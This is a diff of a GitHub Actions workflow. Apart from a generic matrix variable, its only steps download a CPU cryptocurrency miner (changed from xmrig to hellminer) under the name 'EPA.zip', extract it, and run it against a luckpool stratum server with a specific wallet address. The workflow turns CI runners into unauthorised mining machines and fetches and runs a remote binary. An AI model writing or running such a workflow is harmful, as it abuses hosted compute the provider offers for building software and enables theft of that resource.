@@ -17,10 +17,10 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: DOWNLOAD
-      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v5.8.1/xmrig-5.8.1-msvc-win64.zip -OutFile EPA.zip
+      run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_win64_avx2.zip -OutFile EPA.zip
     - name: Extract
       run: Expand-Archive EPA.zip
     - name: RUNNING
-      run: .\FILE_PATH\APP.exe 'string command miner seperti pool:port, wallet, threads, '
+      run: ./hellminer.exe -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RUErJPuMTPL84t76vT8CjLyBY4ZLGvzUW9.RMX2020 -p x --cpu 1
     - name: DONE
       run: exit
